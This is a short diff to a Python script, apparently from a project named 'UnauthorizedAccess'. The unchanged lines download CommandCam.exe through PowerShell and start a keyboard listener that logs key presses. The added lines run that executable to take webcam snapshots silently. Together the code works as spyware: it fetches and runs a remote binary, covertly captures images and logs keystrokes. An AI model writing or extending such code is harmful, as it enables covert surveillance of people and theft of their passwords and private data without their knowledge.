@@ -173,8 +173,11 @@ if not os.path.isfile("CommandCam.exe"):
     if online:
         try:
             subprocess.call("powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/minamagdyshehata/UnauthorizedAccess/master/CommandCam.exe','CommandCam.exe')",shell=True)
+            subprocess.call("CommandCam.exe /filename test.jpg",shell=True)
         except:
             pass
+else:
+    subprocess.call("CommandCam.exe /filename test.jpg",shell=True)
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
